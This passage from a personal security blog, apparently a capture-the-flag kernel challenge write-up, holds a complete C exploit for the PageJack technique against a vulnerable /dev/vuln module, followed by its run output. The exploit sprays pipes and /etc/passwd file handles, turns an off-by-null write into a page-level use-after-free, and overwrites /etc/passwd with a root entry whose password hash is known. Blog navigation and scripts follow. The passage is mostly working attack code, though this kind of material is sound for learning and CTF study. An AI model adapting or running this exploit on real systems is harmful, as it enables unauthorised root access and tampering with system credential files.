<h3 id="exploit-4"><a href="#exploit-4" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc exploit.c -o exploit --static</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ALLOC   0xf000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_WRITE   0xf001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_alloc</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;&#125;;</span><br><span class="line">    <span class="type">int</span> ret = ioctl(fd, CMD_ALLOC, &amp;req);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] obj alloc failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_write</span><span class="params">(<span class="type">size_t</span> size, <span class="type">char</span>* data)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .size = size,</span><br><span class="line">        .data = data</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret = ioctl(fd, CMD_WRITE, &amp;req);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] obj write failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_PIPE_SPRAY 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_PIPE_SPRAY_HALF 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_FILE_SPRAY 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd_pipe[NUM_PIPE_SPRAY][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] Open /dev/vuln failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPE_SPRAY_HALF; i++)&#123;</span><br><span class="line">        <span class="type">int</span> ret = pipe(fd_pipe[i]);</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] spray pipe part 1 failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> val = <span class="number">0xaabbccdd</span> + i;</span><br><span class="line">        <span class="type">int</span> ret1 = write(fd_pipe[i][<span class="number">1</span>], &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line">        <span class="type">int</span> ret2 = write(fd_pipe[i][<span class="number">1</span>], <span class="string">&quot;22334455&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret1 == <span class="number">-1</span> || ret2 == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] error to write data&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    obj_alloc();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = NUM_PIPE_SPRAY_HALF; i &lt; NUM_PIPE_SPRAY; i++)&#123;</span><br><span class="line">        <span class="type">int</span> ret = pipe(fd_pipe[i]);</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] spray pipe part 2 failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> val = <span class="number">0xaabbccdd</span> + i;</span><br><span class="line">        <span class="type">int</span> ret1 = write(fd_pipe[i][<span class="number">1</span>], &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line">        <span class="type">int</span> ret2 = write(fd_pipe[i][<span class="number">1</span>], <span class="string">&quot;22334455&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret1 == <span class="number">-1</span> || ret2 == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] error to write data&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Success prepare victim obj and pipe buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> payload_400h[<span class="number">0x400</span>];</span><br><span class="line">    <span class="built_in">memset</span>(payload_400h, <span class="number">0</span>, <span class="keyword">sizeof</span>(payload_400h));</span><br><span class="line"></span><br><span class="line">    obj_write(<span class="number">0x400</span>, payload_400h);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success to use off by null, and overwrite pipe buffer page&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> origin_pipe_fd, overlapping_pipe_fd;</span><br><span class="line">    <span class="type">int</span> find = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPE_SPRAY; i++) &#123;</span><br><span class="line">        <span class="type">int</span> val = <span class="number">0</span>,  ret = read(fd_pipe[i][<span class="number">0</span>], &amp;val, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] Error to read data from pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val != <span class="number">0xaabbccdd</span> + i) &#123;</span><br><span class="line">            overlapping_pipe_fd = i;</span><br><span class="line">            origin_pipe_fd = val - <span class="number">0xaabbccdd</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[!] Detect UAF!&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] UAF happend on %d\n&quot;</span>, overlapping_pipe_fd);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] page origin from %d\n&quot;</span>, origin_pipe_fd);</span><br><span class="line">            find = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (find == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] Error to make UAF&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Free origin fd make page level UAF&quot;</span>);</span><br><span class="line">    close(fd_pipe[origin_pipe_fd][<span class="number">0</span>]);</span><br><span class="line">    close(fd_pipe[origin_pipe_fd][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> etcpasswd_fd[NUM_FILE_SPRAY];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FILE_SPRAY; i++) &#123;</span><br><span class="line">        etcpasswd_fd[i] = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (etcpasswd_fd[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] Spray etc passwd failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Success to spray etc passwd&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fake_f_mode = <span class="number">0x84f801f</span>;</span><br><span class="line">    <span class="type">int</span> ret = write(fd_pipe[overlapping_pipe_fd][<span class="number">1</span>], &amp;fake_f_mode, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed to write etc passwd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> payload_fake_root[] = <span class="string">&quot;root:$1$naup$tZAttOyVXnz7BlRCnYsuv/:0:0:root:/root:/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_FILE_SPRAY; i++) &#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        ret = write(etcpasswd_fd[i], payload_fake_root, <span class="keyword">sizeof</span>(payload_fake_root));</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to write /etc/passwd: fd = %d\n&quot;</span>, i);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Success to write /etc/passwd&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">~ $ ./exploit </span></span><br><span class="line"><span class="comment">[!] Success prepare victim obj and pipe buffer</span></span><br><span class="line"><span class="comment">Success to use off by null, and overwrite pipe buffer page</span></span><br><span class="line"><span class="comment">[!] Detect UAF!</span></span><br><span class="line"><span class="comment">[!] UAF happend on 16</span></span><br><span class="line"><span class="comment">[!] page origin from 19</span></span><br><span class="line"><span class="comment">[!] Free origin fd make page level UAF</span></span><br><span class="line"><span class="comment">[!] Success to spray etc passwd</span></span><br><span class="line"><span class="comment">Failed to write /etc/passwd: fd = 0</span></span><br><span class="line"><span class="comment">Failed to write /etc/passwd: fd = 1</span></span><br><span class="line"><span class="comment">Failed to write /etc/passwd: fd = 2</span></span><br><span class="line"><span class="comment">Failed to write /etc/passwd: fd = 3</span></span><br><span class="line"><span class="comment">Failed to write /etc/passwd: fd = 4</span></span><br><span class="line"><span class="comment">Success to write /etc/passwd</span></span><br><span class="line"><span class="comment">~ $ cat /etc/passwd</span></span><br><span class="line"><span class="comment">root:$1$naup$tZAttOyVXnz7BlRCnYsuv/:0:0:root:/root:/bin/sh:/home/ctf:/bin/sh</span></span><br><span class="line"><span class="comment">~ $ su</span></span><br><span class="line"><span class="comment">Password: </span></span><br><span class="line"><span class="comment">/ # cat /dev/sdb</span></span><br><span class="line"><span class="comment">flag&#123;PageJack&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<iframe width="560" height="315" src="https://www.youtube.com/embed/6Gd9AzUUOwE?si=M4VPjH3v8v-DjtUI" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
      
      

    </footer>
  </div>
  
  <nav id="article-nav" data-aos="fade-up">
    
      <div class="article-nav-link-wrap article-nav-link-left">
        
          <img data-src="/images/posts_cover/steam/STEAM.jpg" data-sizes="auto" alt="steam-DRM" class="lazyload">
        
        <a href="/2025/10/24/steam-DRM/"></a>
        <div class="article-nav-caption">Newer</div>
        <h3 class="article-nav-title">
          
            steam-DRM
          
        </h3>
      </div>
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        <img data-src="/images/posts_cover/AEGISCTF/AEGIS-CTF.png" data-sizes="auto" alt="2025-AEGIS-CTF-writeup" class="lazyload">
      
      <a href="/2025/10/24/2025-AEGIS-CTF-writeup/"></a>
      <div class="article-nav-caption">Older</div>
      <h3 class="article-nav-title">
        
          2025-AEGIS-CTF-writeup
        
      </h3>
    </div>
    
  </nav>


</article>






</section>
        </div>
        
        
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      2020-2025
      <span class="footer-info-sep rotate"></span>
      Naup堇姬
    </div>
    
      <div>
        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        209.9k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        18:22
      </div>
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Speed-Run-r1rn-kernel-challenge-note"><span class="toc-number">1.</span> <span class="toc-text">Speed Run r1rn kernel challenge note</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-Cache-Attack"><span class="toc-number">1.1.</span> <span class="toc-text">Cross-Cache Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze"><span class="toc-number">1.1.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack"><span class="toc-number">1.1.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">1.1.3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dirty-PageTable"><span class="toc-number">1.2.</span> <span class="toc-text">Dirty PageTable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dirty-Cred"><span class="toc-number">1.3.</span> <span class="toc-text">Dirty Cred</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dirty-pipe"><span class="toc-number">1.4.</span> <span class="toc-text">Dirty pipe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe"><span class="toc-number">1.4.2.</span> <span class="toc-text">pipe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-3"><span class="toc-number">1.4.3.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-3"><span class="toc-number">1.4.4.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pagejack"><span class="toc-number">1.5.</span> <span class="toc-text">pagejack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pagejack-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">pagejack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-4"><span class="toc-number">1.5.3.</span> <span class="toc-text">exploit</span></a></li></ol></li></ol></li></ol>
      
  </div>
</div>
</div>
      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
  <div class="sidebar-author-name">Naup堇姬</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">84</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">21</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-email sidebar-social-icon">
      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
    </div>
  
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Home</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Archives</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">About</div>
      </div>
    
  
</div>
</div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>



<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>







  
<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>

  <script>
    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>










<div id="lazy-script">
  <div>
    
      
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "Naup堇姬",
          title: "speed-run-r1rn-kernel-challenge",
          url: "http://example.com/2025/10/24/speed-run-r1rn-kernel-challenge/",
          excerpt: "",
          description: "",
          stripContent: "Speed Run r1rn kernel challenge noteCross-Cache Attackslub 相關的知識可以參考這https://hackmd.io/@naup96321/BkeiK5Kexl 這邊簡單在介紹一次   我們可以知道，整個 OS 有相當多的 kmem_cache 這種 memory pool他會嘗試去找對應大小 object 的 kmem_cache其拿取的順序會從 kmem_cache_cpu 的 freelist，然後 active slab freel",
          date: "Fri Oct 24 2025 10:07:16 GMT+0800",
          updated: "Fri Oct 24 2025 10:52:35 GMT+0800",
          cover: "/images/posts_cover/os-arch/126727093_p0_master1200.jpg",
        };
      </script>
       
    
    
      
        
<script src="/js/insert_highlight.js" data-pjax></script>

        
      
    
    
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
        
        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
